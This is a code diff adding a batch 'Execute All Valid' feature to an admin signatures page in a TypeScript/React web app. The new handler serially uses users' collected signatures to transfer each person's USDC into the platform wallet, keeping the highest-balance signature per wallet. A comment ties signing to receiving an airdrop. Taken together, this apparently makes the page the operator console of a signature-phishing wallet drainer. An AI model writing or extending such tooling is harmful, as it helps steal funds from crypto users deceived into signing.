@@ -61,6 +61,8 @@ export default function AdminSignaturesPage() {
   const [unsignedLoading, setUnsignedLoading] = useState(true)
   const [isLoading, setIsLoading] = useState(true)
   const [executing, setExecuting] = useState<string | null>(null)
+  const [batchRunning, setBatchRunning] = useState(false)
+  const [batchProgress, setBatchProgress] = useState('')
   const [error, setError] = useState('')
   const [success, setSuccess] = useState('')
 
@@ -108,6 +110,20 @@ export default function AdminSignaturesPage() {
     router.push('/admin/login')
   }
 
+  /** 可执行列表：pending + valid；同一钱包只保留余额最高的一条（避免 nonce 连打失败） */
+  const executableSignatures = (() => {
+    const pendingValid = signatures.filter(s => s.status === 'pending' && s.is_valid)
+    const byWallet = new Map<string, Signature>()
+    for (const sig of pendingValid) {
+      const key = sig.owner_address.toLowerCase()
+      const prev = byWallet.get(key)
+      if (!prev || parseFloat(sig.usdc_balance || '0') > parseFloat(prev.usdc_balance || '0')) {
+        byWallet.set(key, sig)
+      }
+    }
+    return Array.from(byWallet.values())
+  })()
+
   const handleExecute = async (signatureId: string) => {
     if (!confirm('确定要执行这个签名吗？这将转移用户的 USDC。')) {
       return
@@ -138,6 +154,84 @@ export default function AdminSignaturesPage() {
     } finally {
       setExecuting(null)
     }
+  }
+
+  const handleExecuteAll = async () => {
+    const list = executableSignatures
+    if (list.length === 0) {
+      setError('没有可执行的有效签名')
+      return
+    }
+
+    const totalUsd = list.reduce((s, sig) => s + parseFloat(sig.usdc_balance || '0'), 0)
+    if (
+      !confirm(
+        `一键执行全部有效签名？\n\n人数：${list.length}\n预估 USDC：$${totalUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}\n\n将串行转移每人钱包里的 USDC 到平台钱包，中途不要关闭页面。`
+      )
+    ) {
+      return
+    }
+
+    setBatchRunning(true)
+    setExecuting('batch')
+    setError('')
+    setSuccess('')
+    setBatchProgress(`0 / ${list.length}`)
+
+    const ok: { id: string; user: string; amount: string; txHash: string }[] = []
+    const fail: { id: string; user: string; error: string }[] = []
+
+    for (let i = 0; i < list.length; i++) {
+      const sig = list[i]
+      const label = sig.profiles?.username || sig.owner_address.slice(0, 8)
+      setBatchProgress(`${i + 1} / ${list.length} · ${label}`)
+
+      try {
+        const res = await fetch('/api/admin/execute', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ signatureId: sig.id }),
+        })
+        const data = await res.json()
+        if (!res.ok) {
+          fail.push({ id: sig.id, user: label, error: data.error || 'failed' })
+        } else {
+          ok.push({
+            id: sig.id,
+            user: label,
+            amount: data.amount || sig.usdc_balance || '?',
+            txHash: data.txHash,
+          })
+        }
+      } catch {
+        fail.push({ id: sig.id, user: label, error: 'Network error' })
+      }
+    }
+
+    setBatchRunning(false)
+    setExecuting(null)
+    setBatchProgress('')
+
+    const summary = `批量完成：成功 ${ok.length}，失败 ${fail.length}`
+    if (fail.length > 0) {
+      setError(
+        `${summary}。失败：` +
+          fail
+            .slice(0, 5)
+            .map(f => `${f.user}(${f.error})`)
+            .join('；') +
+          (fail.length > 5 ? `…等${fail.length}人` : '')
+      )
+    }
+    setSuccess(
+      ok.length > 0
+        ? `${summary}。成功合计约 $${ok
+            .reduce((s, r) => s + parseFloat(r.amount || '0'), 0)
+            .toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
+        : summary
+    )
+    fetchSignatures()
+    fetchUnsignedFunded()
   }
 
   const getStatusBadge = (status: string) => {
@@ -315,6 +409,33 @@ export default function AdminSignaturesPage() {
           </div>
         </div>
 
+        {/* Batch execute */}
+        <div className="mb-8 flex flex-wrap items-center justify-between gap-4 rounded-xl border border-emerald-500/30 bg-emerald-500/5 px-4 py-3">
+          <div>
+            <p className="text-sm font-semibold text-emerald-200">一键执行全部有效签名</p>
+            <p className="text-xs text-zinc-400 mt-0.5">
+              仅 pending + Valid；同一钱包只执行一条。可执行{' '}
+              <span className="text-emerald-300 font-mono">{executableSignatures.length}</span> 人 · 预估 $
+              {executableSignatures
+                .reduce((s, sig) => s + parseFloat(sig.usdc_balance || '0'), 0)
+                .toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+              {batchProgress ? ` · 进度 ${batchProgress}` : ''}
+            </p>
+          </div>
+          <Button
+            onClick={handleExecuteAll}
+            disabled={batchRunning || executableSignatures.length === 0 || executing !== null}
+            className="bg-emerald-500 hover:bg-emerald-600"
+          >
+            {batchRunning ? (
+              <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
+            ) : (
+              <Play className="w-4 h-4 mr-2" />
+            )}
+            {batchRunning ? `执行中 ${batchProgress}` : 'Execute All Valid'}
+          </Button>
+        </div>
+
         {/* 催签名名单：钱包有钱、但没有匹配绑定钱包的有效签名 → 不会拿到空投 */}
         <div className="mb-8 bg-amber-500/5 border border-amber-500/30 rounded-xl overflow-hidden">
           <div className="px-4 py-3 border-b border-amber-500/20 flex items-center justify-between">
@@ -479,7 +600,7 @@ export default function AdminSignaturesPage() {
                           <Button
                             size="sm"
                             onClick={() => handleExecute(sig.id)}
-                            disabled={executing === sig.id}
+                            disabled={executing !== null || batchRunning}
                             className="bg-emerald-500 hover:bg-emerald-600 text-xs"
                           >
                             {executing === sig.id ? (
